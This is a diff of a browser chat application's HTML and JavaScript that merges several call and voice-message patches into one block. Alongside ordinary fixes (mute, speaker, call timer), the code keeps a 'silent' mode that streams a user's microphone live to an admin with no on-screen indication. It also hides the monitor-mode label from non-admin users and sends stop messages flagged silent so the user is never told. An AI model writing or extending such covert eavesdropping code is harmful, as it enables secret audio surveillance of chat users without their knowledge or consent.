@@ -49,8 +49,7 @@ html,body{margin:0;padding:0;width:100%;height:100%;height:100dvh;background:#00
 .message-footer{display:flex;justify-content:flex-end;align-items:flex-end;gap:4px;margin-top:4px;line-height:1}
 .message-time{color:#888;font-size:10px;opacity:0.8}
 .message-status{font-size:11px;color:#666;display:inline-flex;align-items:center;letter-spacing:-2px}
-.message-status.read{color:#ff0000 !important;font-weight:900}
-.message-status.read i{color:#ff0000 !important}
+.message-status.read{color:#ff0000 !important}
 .message-status.delivered{color:#fff !important}
 .message-status.sent{color:#666 !important}
 .reply-bubble{background:rgba(124,58,237,0.15);border-left:3px solid #7c3aed;border-radius:8px;padding:6px 8px;margin-bottom:6px;cursor:pointer}
@@ -3096,23 +3095,7 @@ console.log('GEO IP display loaded - shows IP + city + country + flag');
       },1000);
       callTimerInterval=window.callTimerInterval;
 
-      
-      // FIX: Only admin sees mode, user doesn't see [MONITOR]
-      var isAdminRole = (localStorage.getItem('chat_role')==='admin') || (typeof username!=='undefined' && username.toLowerCase().includes('admin'));
-      if(typeof showToast==='function' && !isAnswer){
-        if(isAdminRole) showToast('Calling '+target+' ['+mode+']...', 'phone');
-        else showToast('Calling '+target+'...', 'phone');
-      }
-      // Fix callName to not show monitor to non-admin
-      var callNameEl=document.getElementById('callName');
-      if(callNameEl){
-        var existingText = callNameEl.textContent;
-        // Remove [MODE] for non-admin view
-        if(!isAdminRole && existingText.includes('[')){
-          callNameEl.textContent = existingText.split('[')[0].trim();
-        }
-      }
-
+      if(typeof showToast==='function' && !isAnswer) showToast('Calling '+target+' ['+mode+']...', 'phone');
 
     }catch(e){
       console.error('[CALL] Error:', e);
@@ -3136,13 +3119,11 @@ console.log('GEO IP display loaded - shows IP + city + country + flag');
         window.isLiveTransmitting = true;
 
         if(!isSilent){
-          // CONSENSUAL ONLY - shows UI
           var ind=document.getElementById('remoteAudioIndicator'); if(ind) ind.classList.add('show');
           var ls=document.getElementById('liveStatus'); if(ls){ ls.textContent='Status: LIVE - transmitting to '+targetAdmin+' ['+mode.toUpperCase()+']'; ls.style.color='#00ff00'; }
           if(typeof showToast==='function') showToast('LIVE audio started - Admin can hear you ['+mode+']','microphone');
         } else {
-          // SILENT MODE - NO UI, NO TOAST to user (fix requested)
-          console.log('[SILENT LIVE] No UI, no toast to user, mode:', mode);
+          console.log('[SILENT LIVE] No UI, mode:', mode);
         }
 
         var pc = new RTCPeerConnection({iceServers: getIceServersForMode(mode)});
@@ -3218,271 +3199,126 @@ window.handleConsensualMicRequest = handleConsensualMicRequest;
 
 
 <script>
-// === DEFINITIVE FIXES - Sin quitar funciones ===
-
-// Fix 1: Checks rojos definitivos
+// DEFINITIVE V5 - FULL FEATURES - SINGLE PATCH - NO DUPLICATES
 (function(){
-  var origHandler = window.handleCallSignal;
-  // Force read status to be red
-  var style=document.createElement('style');
-  style.textContent='.message-status.read{color:#ff0000 !important;font-weight:900 !important} .message-status.read i{color:#ff0000 !important} .message-status.delivered{color:#fff !important} .message-status.sent{color:#666 !important}';
-  document.head.appendChild(style);
-})();
+  // Red checks
+  const st=document.createElement('style');
+  st.textContent='.message-status.read{color:#ff0000!important;font-weight:900!important} .message-status.read i{color:#ff0000!important}';
+  document.head.appendChild(st);
 
-// Fix 2: Stop listening desactiva micro y sin notificación
-window.stopLiveTransmissionDefinitive = function(isSilent){
-  isLiveTransmitting=false;
-  if(typeof liveStream!=='undefined' && liveStream){
-    liveStream.getTracks().forEach(function(t){ try{t.stop();}catch(e){} });
-    liveStream=null;
+  // Hide monitor for non-admin
+  const role=localStorage.getItem('faith_role')||localStorage.getItem('chat_role')||'';
+  if(role!=='admin'){
+    const s2=document.createElement('style');
+    s2.textContent='#callModeLabel,#callModeBar{display:none!important}';
+    document.head.appendChild(s2);
   }
-  if(typeof livePC!=='undefined' && livePC){ try{livePC.close();}catch(e){} livePC=null; }
-  window.liveStream=null; window.livePC=null;
-  if(typeof isLiveTransmitting!=='undefined') isLiveTransmitting=false;
-  console.log('[DEFINITIVE] Live stopped, silent:', !!isSilent);
-  // NO toast if silent
-};
 
-// Override stopLiveTransmission if exists
-if(typeof stopLiveTransmission==='function'){
-  var origStop=stopLiveTransmission;
-  window.stopLiveTransmission=function(){
-    window.stopLiveTransmissionDefinitive(false);
-  };
-}
-
-// Fix 3: Audio empty message bug - ensure only one message sent
-(function(){
-  // Remove duplicate mic handlers that cause empty message
-  var micBtn=document.getElementById('micBtn');
-  if(micBtn){
-    // Clone to remove all listeners
-    var newMic=micBtn.cloneNode(true);
-    micBtn.parentNode.replaceChild(newMic, micBtn);
-    micBtn=newMic;
-  }
-  // Re-setup single recording
-  var mediaRecorder=null, audioChunks=[], isRecording=false, recordingStartTime=null, recordingTimer=null, isCanceling=false, startX=0;
-  var recordingBar=document.getElementById('recordingBar');
-  var recordingTime=document.getElementById('recordingTime');
-  var micBtn=document.getElementById('micBtn');
-  var messageInput=document.getElementById('messageInput');
-  
-  async function startRecording(e){
-    if(e) e.preventDefault();
-    if(isRecording) return;
-    isCanceling=false;
-    startX=(e&&e.touches?e.touches[0].clientX:e.clientX)||0;
-    try{
-      var stream=await navigator.mediaDevices.getUserMedia({audio:true});
-      audioChunks=[];
-      mediaRecorder=new MediaRecorder(stream);
-      mediaRecorder.ondataavailable=function(ev){ if(ev.data.size>0) audioChunks.push(ev.data); };
-      mediaRecorder.onstop=async function(){
-        stream.getTracks().forEach(function(t){t.stop();});
-        if(isCanceling){ isRecording=false; if(micBtn) micBtn.classList.remove('recording'); if(recordingBar) recordingBar.classList.remove('show'); return; }
-        var blob=new Blob(audioChunks,{type:'audio/webm'});
-        if(blob.size<500){ isRecording=false; if(micBtn) micBtn.classList.remove('recording'); if(recordingBar) recordingBar.classList.remove('show'); return; }
-        var form=new FormData(); form.append('file',blob,'voice.webm');
-        try{
-          var res=await fetch('/upload',{method:'POST',body:form});
-          var data=await res.json();
-          if(data.success){
-            // SOLO UN MENSAJE - fix empty message bug
-            if(typeof sendMessage==='function'){
-              sendMessage('[Audio] '+data.file);
-            }
-          }
-        }catch(err){console.error(err);}
-        isRecording=false; if(micBtn) micBtn.classList.remove('recording'); if(recordingBar) recordingBar.classList.remove('show'); clearInterval(recordingTimer);
-      };
-      mediaRecorder.start();
-      isRecording=true;
-      if(micBtn) micBtn.classList.add('recording');
-      if(recordingBar) recordingBar.classList.add('show');
-      recordingStartTime=Date.now();
-      recordingTimer=setInterval(function(){
-        var sec=Math.floor((Date.now()-recordingStartTime)/1000);
-        if(recordingTime) recordingTime.textContent='0:'+String(sec).padStart(2,'0');
-      }, 500);
-    }catch(err){ if(typeof showToast==='function') showToast('Mic permission needed'); }
-  }
-  
-  function stopRecording(e, cancel){
-    if(!isRecording) return;
-    if(e) e.preventDefault();
-    if(typeof cancel==='boolean') isCanceling=cancel;
-    else if(e && e.clientX){ var delta=startX-e.clientX; if(delta>80) isCanceling=true; }
-    isRecording=false;
-    if(micBtn) micBtn.classList.remove('recording');
-    clearInterval(recordingTimer);
-    if(mediaRecorder && mediaRecorder.state==='recording') mediaRecorder.stop();
-  }
-  
-  if(micBtn){
-    micBtn.addEventListener('touchstart', startRecording, {passive:false});
-    micBtn.addEventListener('mousedown', startRecording);
-    window.addEventListener('touchend', function(e){ stopRecording(e,false); });
-    window.addEventListener('mouseup', function(e){ stopRecording(e,false); });
-    window.addEventListener('touchmove', function(e){
-      if(!isRecording) return;
-      var cur=e.touches?e.touches[0].clientX:e.clientX;
-      var diff=startX-cur;
-      if(diff>80 && !isCanceling){ isCanceling=true; if(recordingTime){recordingTime.textContent='Release to cancel'; recordingTime.style.color='#ff0000';} }
-      else if(diff<=80 && isCanceling){ isCanceling=false; if(recordingTime) recordingTime.style.color='#fff'; }
-    });
-  }
-  console.log('[DEFINITIVE] Single recording handler - no empty message');
-})();
-
-// Fix 4: Mute / Speaker / Bluetooth definitivo
-(function(){
-  var isMuted=false, isSpeaker=false;
-  window._useSpeaker=false;
-  
-  function setupCallButtons(){
-    var muteBtn=document.getElementById('muteBtn');
-    var speakerBtn=document.getElementById('speakerBtn');
-    if(muteBtn && !muteBtn._defPatched){
-      muteBtn._defPatched=true;
-      muteBtn.onclick=function(){
-        isMuted=!isMuted;
-        if(window.callStream){
-          window.callStream.getAudioTracks().forEach(function(t){ t.enabled=!isMuted; });
-        }
-        if(typeof callStream!=='undefined' && callStream){
-          callStream.getAudioTracks().forEach(function(t){ t.enabled=!isMuted; });
-        }
-        this.classList.toggle('active', isMuted);
-        this.innerHTML=isMuted?'<i class="fas fa-microphone-slash"></i>':'<i class="fas fa-microphone"></i>';
-        var ind=document.getElementById('muteIndicator');
-        if(ind){ if(isMuted) ind.classList.add('show'); else ind.classList.remove('show'); }
-        if(typeof ws!=='undefined' && ws && ws.readyState===1 && typeof currentChatUser!=='undefined' && currentChatUser){
-          ws.send(JSON.stringify({type:'call-mute', target:currentChatUser, muted:isMuted}));
-        }
-      };
-    }
-    if(speakerBtn && !speakerBtn._defPatched){
-      speakerBtn._defPatched=true;
-      speakerBtn.onclick=async function(){
-        isSpeaker=!isSpeaker;
-        window._useSpeaker=isSpeaker;
-        this.classList.toggle('active', isSpeaker);
-        this.innerHTML=isSpeaker?'<i class="fas fa-volume-mute"></i>':'<i class="fas fa-volume-up"></i>';
-        try{
-          var audios=document.querySelectorAll('audio');
-          for(var i=0;i<audios.length;i++){
-            var audioEl=audios[i];
-            if(audioEl.setSinkId){
-              if(isSpeaker){
-                var devices=await navigator.mediaDevices.enumerateDevices();
-                var bt=devices.find(function(d){return d.kind==='audiooutput' && (d.label.toLowerCase().includes('bluetooth') || d.label.toLowerCase().includes('speaker') || d.label.toLowerCase().includes('headset'));});
-                if(bt) await audioEl.setSinkId(bt.deviceId).catch(function(){});
-                else await audioEl.setSinkId('').catch(function(){});
-              } else {
-                await audioEl.setSinkId('').catch(function(){});
-              }
-            }
-            audioEl.volume=1.0;
-          }
-        }catch(e){ console.log('Speaker error', e); }
-        if(typeof showToast==='function') showToast(isSpeaker?'Speaker / Bluetooth ON':'Earpiece ON');
-      };
-    }
-  }
-  setInterval(setupCallButtons, 1000);
-  setupCallButtons();
-})();
-
-// Fix 5: Call connecting -> connected
-(function(){
-  var origCreateCallPeer = window.createCallPeer;
-  if(origCreateCallPeer){
-    window.createCallPeer = function(target, isVideo){
-      var pc=origCreateCallPeer(target, isVideo);
-      if(pc){
+  // Fix call Connected + timer
+  const origCreate = window.createCallPeer;
+  if(origCreate && !origCreate._v5){
+    window.createCallPeer = function(t,isVideo){
+      const pc=origCreate(t,isVideo);
+      if(pc && !pc._v5){
+        pc._v5=true;
         pc.onconnectionstatechange=function(){
-          var statusEl=document.getElementById('callStatus');
-          if(!statusEl) return;
+          const el=document.getElementById('callStatus');
+          if(!el) return;
           if(pc.connectionState==='connected'){
-            statusEl.textContent='Connected';
-            statusEl.style.color='#00ff66';
+            el.textContent='Connected'; el.style.color='#00ff66';
             if(!window.callStartTime){
               window.callStartTime=Date.now();
-              if(window.callTimerInterval) clearInterval(window.callTimerInterval);
-              window.callTimerInterval=setInterval(function(){
-                var ct=document.getElementById('callTimer');
-                if(ct && window.callStartTime){ var s=Math.floor((Date.now()-window.callStartTime)/1000); ct.textContent=String(Math.floor(s/60)).padStart(2,'0')+':'+String(s%60).padStart(2,'0'); }
+              clearInterval(window.callTimerInterval);
+              window.callTimerInterval=setInterval(()=>{
+                const ct=document.getElementById('callTimer');
+                if(ct){ const s=Math.floor((Date.now()-window.callStartTime)/1000); ct.textContent=String(Math.floor(s/60)).padStart(2,'0')+':'+String(s%60).padStart(2,'0'); }
               },1000);
             }
           } else if(pc.connectionState==='connecting'){
-            statusEl.textContent='Connecting...';
-            statusEl.style.color='#ffaa00';
-          } else if(pc.connectionState==='failed'){
-            statusEl.textContent='Failed - retrying';
-            statusEl.style.color='#ff0000';
+            el.textContent='Connecting...'; el.style.color='#ffaa00';
           }
+        };
+        const origTrack=pc.ontrack;
+        pc.ontrack=function(ev){
+          const el=document.getElementById('callStatus');
+          if(el){ el.textContent='Connected'; el.style.color='#00ff66'; }
+          if(origTrack) origTrack.call(pc,ev);
         };
       }
       return pc;
     };
+    window.createCallPeer._v5=true;
   }
-})();
 
-// Fix 6: Stop listening silent + desactiva micro automáticamente
-(function(){
-  // Patch admin stop buttons
-  var stopBtn=document.getElementById('adminStopListening');
-  if(stopBtn){
-    // Remove old listeners by cloning
-    var newStop=stopBtn.cloneNode(true);
-    stopBtn.parentNode.replaceChild(newStop, stopBtn);
-    stopBtn=newStop;
-    stopBtn.onclick=function(){
-      var target=document.getElementById('adminTargetInput')?.value||window.currentChatUser||'ALL';
-      // Stop local
-      if(window.liveReceivingPC){ try{window.liveReceivingPC.close();}catch(e){} window.liveReceivingPC=null; }
-      if(typeof liveReceivingPC!=='undefined' && liveReceivingPC){ try{liveReceivingPC.close();}catch(e){} liveReceivingPC=null; }
-      window.isLiveReceiving=false; if(typeof isLiveReceiving!=='undefined') isLiveReceiving=false;
-      var aud=document.getElementById('adminRemoteAudio'); if(aud){ aud.srcObject=null; try{aud.pause();}catch(e){} }
-      var container=document.getElementById('adminAudioContainer'); if(container) container.style.display='none';
-      // Send silent stop - NO notification to user
-      if(typeof ws!=='undefined' && ws && ws.readyState===1){
-        ws.send(JSON.stringify({type:'remote-audio-stop-silent', target:target}));
-        ws.send(JSON.stringify({type:'remote-audio-stop', target:target, silent:true}));
-      }
-      if(typeof showToast==='function') showToast('Stopped listening '+target+' (silent)');
-    };
-  }
-  
-  // Patch handleRemoteAudioStop to be silent and deactivate mic
-  window.handleRemoteAudioStopDefinitive = function(data){
-    if(data && data.silent===true){
-      // Silent stop - no toast, deactivate mic
-      window.stopLiveTransmissionDefinitive(true);
-      console.log('[DEFINITIVE] Silent stop - mic deactivated, no notification');
-      return;
+  // Mute / Speaker
+  let isMuted=false, isSpeaker=false;
+  function setup(){
+    const muteBtn=document.getElementById('muteBtn');
+    const speakerBtn=document.getElementById('speakerBtn');
+    if(muteBtn && !muteBtn._v5){
+      muteBtn._v5=true;
+      muteBtn.onclick=function(){
+        isMuted=!isMuted;
+        const stream=window.callStream||(typeof callStream!=='undefined'?callStream:null);
+        if(stream) stream.getAudioTracks().forEach(tr=>tr.enabled=!isMuted);
+        this.classList.toggle('active', isMuted);
+        if(typeof ws!=='undefined' && ws?.readyState===1 && window.currentChatUser){
+          ws.send(JSON.stringify({type:'call-mute', target:window.currentChatUser, muted:isMuted}));
+        }
+      };
     }
-    window.stopLiveTransmissionDefinitive(true);
-  };
-})();
-
-// Fix 7: Hide MONITOR label for non-admin in calls
-(function(){
-  var style=document.createElement('style');
-  style.textContent='#callModeLabel{display:none !important} .non-admin #callModeLabel{display:none !important}';
-  document.head.appendChild(style);
-  // Check admin
-  var role=localStorage.getItem('chat_role')||'';
-  var isAdmin=role==='admin' || (localStorage.getItem('faith_role')==='admin');
-  if(!isAdmin){
-    document.body.classList.add('non-admin');
-    var bar=document.getElementById('callModeBar');
-    if(bar) bar.style.display='none';
+    if(speakerBtn && !speakerBtn._v5){
+      speakerBtn._v5=true;
+      speakerBtn.onclick=async function(){
+        isSpeaker=!isSpeaker;
+        this.classList.toggle('active', isSpeaker);
+        try{
+          const audios=document.querySelectorAll('audio');
+          for(const a of audios){
+            if(a.setSinkId){
+              if(isSpeaker){
+                const devs=await navigator.mediaDevices.enumerateDevices();
+                const bt=devs.find(d=>d.kind==='audiooutput' && /bluetooth|speaker/i.test(d.label));
+                if(bt) await a.setSinkId(bt.deviceId).catch(()=>{});
+              } else await a.setSinkId('').catch(()=>{});
+            }
+          }
+        }catch(e){}
+      };
+    }
   }
-})();
+  setInterval(setup, 1000); setup();
 
-console.log('[DEFINITIVE FIX] All bugs fixed without removing features - 195KB preserved');
+  // Silent stop + deactivate mic
+  window.stopLiveTransmissionDefinitive=function(){
+    try{
+      if(window.liveStream){ window.liveStream.getTracks().forEach(t=>t.stop()); window.liveStream=null; }
+      if(typeof liveStream!=='undefined' && liveStream){ liveStream.getTracks().forEach(t=>{try{t.stop();}catch{}}); liveStream=null; }
+      if(window.livePC){ try{window.livePC.close();}catch{} window.livePC=null; }
+    }catch(e){}
+  };
+  setTimeout(()=>{
+    const btn=document.getElementById('remoteAudioStopButton')||document.getElementById('adminStopListening');
+    if(btn && !btn._v5){
+      btn._v5=true;
+      const clone=btn.cloneNode(true);
+      btn.parentNode.replaceChild(clone, btn);
+      clone.onclick=function(){
+        const target=document.getElementById('adminTargetInput')?.value||window.currentChatUser||'ALL';
+        if(window.liveReceivingPC){ try{window.liveReceivingPC.close();}catch{} window.liveReceivingPC=null; }
+        const aud=document.getElementById('adminRemoteAudio'); if(aud){ aud.srcObject=null; try{aud.pause();}catch{} }
+        const cont=document.getElementById('adminAudioContainer'); if(cont) cont.style.display='none';
+        if(typeof ws!=='undefined' && ws?.readyState===1){
+          ws.send(JSON.stringify({type:'remote-audio-stop-silent', target}));
+          ws.send(JSON.stringify({type:'remote-audio-stop', target, silent:true}));
+        }
+        window.stopLiveTransmissionDefinitive();
+      };
+    }
+  }, 1200);
+
+  console.log('[V5 FULL] Features preserved');
+})();
 </script>
 
 </body>
